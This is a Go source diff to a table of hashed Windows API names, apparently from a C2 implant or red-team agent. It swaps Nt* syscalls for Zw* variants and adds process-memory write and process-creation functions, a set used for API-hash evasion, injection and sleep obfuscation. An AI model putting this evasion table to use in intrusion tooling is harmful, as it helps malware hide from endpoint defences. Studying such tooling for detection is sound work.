@@ -144,14 +144,14 @@ var ApiNameHashes = []uint64{
 	0xBBCD1381F969714B, //WinHttpReadData 8
 	0xE91AC4AB50E39E3E, //WinHttpCloseHandle 9
 	0x934CBF2CB5BA65FE, //RtlGetVersion 10
-	0xE7BF643E93800065, //NtClose 11
-	0x96366A0AA4E7804E, //NtOpenProcessToken 12
-	0x1F25DB6092C0F340, //NtOpenThreadToken 13
-	0x30650DA980EEDACA, //NtQueryInformationToken 14
+	0xE7BF643EF6800065, //ZwClose 11
+	0x96366A0AA4EA984E, //ZwOpenProcessToken 12
+	0x1F25DB60944CF340, //ZwOpenThreadToken 13
+	0x306570A980EEDACA, //ZwQueryInformationToken 14
 	0x75A514F31871F04A, //RtlAllocateHeap 15
 	0x75A4A0B9D2C3F04A, //RtlReAllocateHeap 16
 	0xD3B77E4DD8696D61, //RtlRandomEx 17
-	0x7416C5FD78F4D55E, //NtGetTickCount 18
+	0x7416C5FD78F4D55E, //NtGetTickCount 18 ** THERE IS NO ZW ALTERNATIVE **
 	0x5FC99BF0197A7133, //GetAdaptersInfo 19
 	0x61EF0CEE5979D62B, //GetUserNameA 20
 	0xC89E0CCD2E1EF42B, //GetComputerNameExA 21
@@ -164,33 +164,36 @@ var ApiNameHashes = []uint64{
 	0x1261F2B90D585BD0, //GetSystemTimeAsFileTime 28
 	0x9774D5E616F6E65D, //GetSystemMetrics 29
 	0x833DC9DAFB63D357, //RtlCreateTimerQueue 30
-	0xED3C945CBD30E659, //NtCreateEvent 31
+	0xED55545CBD30E659, //ZwCreateEvent 31
 	0xC51DBF692B44F360, //RtlCaptureContext 32
 	0xDB1E978CBD30E657, //RtlCreateTimer 33
 	0x6A1D8DC13D39EA44, //RtlRegisterWait 34
 	0x833E0AB7BBE3D357, //RtlDeleteTimerQueue 35
 	0x6C2F0C759B1FDAA3, //RtlCopyMappedMemory 36
-	0x1316841BB3E02BB2, //NtWaitForSingleObject 37
-	0xDEDEBF4CA2AFD250, //NtSignalAndWaitForSingleObject 38
-	0xEBBB4F4DDBE1F501, //NtContinue 39
-	0xDD97B45E9969F510, //NtSetEvent 40
-	0x7F13D5240731024E, //NtSetContextThread 41
-	0x6EFE64DB33C8623C, //NtDuplicateObject 42
+	0x2BD6841BB3E02BB2, //ZwWaitForSingleObject 37
+	0x105EBF4CA2AFD251, //ZwSignalAndWaitForSingleObject 38
+	0xEBBB4F4DDBE1F819, //ZwContinue 39
+	0xDD97B45E9969F828, //ZwSetEvent 40
+	0x7F13D52407341A4E, //ZwSetContextThread 41
+	0x6EFE64DB3554623C, //ZwDuplicateObject 42
 	0x9B2E41BE54366260, //VirtualProtect 43
 	0x8231D59A3A04EF1D, //SystemFunction032 44
 	0x38B9B8DA106ECFF9, //WaitForSingleObjectEx 45
 	0x110F544938E7BE7F, //LdrGetProcedureAddress 46
-	0x210CDD966E269A36, //NtQueryVirtualMemory 47
+	0x810CDD966E269A42, //ZwQueryVirtualMemory 47
 	0x65067263CD6B0D3D, //BaseThreadInitThunk 48
 	0x391E03B20EE79746, //RtlUserThreadStart 49
-	0x9607968A9BB2F104, //NtOpenThread 50
-	0x152B6E96EC14D617, //NtAllocateVirtualMemory 51
-	0x38569CF2AE25D62E, //NtProtectVirtualMemory 52
-	0x12C236DB812A6662, //NtCreateThreadEx 53
-	0x2809B7DAA4F109C0, //NtSetInformationVirtualMemory 54
-	0x5104B1D495A6042F, //NtQueryInformationProcess 55
-	0x273BFEFE54376655, //NtOpenProcess 56
-	0xB10CDAF22E03DF9B, //NtReadVirtualMemory 57
+	0xA267968A9BB2F104, //ZwOpenThread 50
+	0x152BD196EC14D617, //ZwAllocateVirtualMemory 51
+	0x38881CF2AE25D62E, //ZwProtectVirtualMemory 52
+	0x12C236DC472A6662, //ZwCreateThreadEx 53
+	0xE809B7DAA4F109D8, //ZwSetInformationVirtualMemory 54
+	0x5104B1D621A6042F, //ZwQueryInformationProcess 55
+	0x2754BEFE54376655, //ZwOpenProcess 56
+	0xB10CDAF22E03E5CB, //ZwReadVirtualMemory 57
+	0x810CDB16F023A642, //ZwWriteVirtualMemory 58
+	0x3EC66B37CD7D55C3, //ZwCreateUserProcess 59
+	0x41A30E514F409A31, //RtlCreateProcessParametersEx 60
 }
 
 var DllNames = []string{
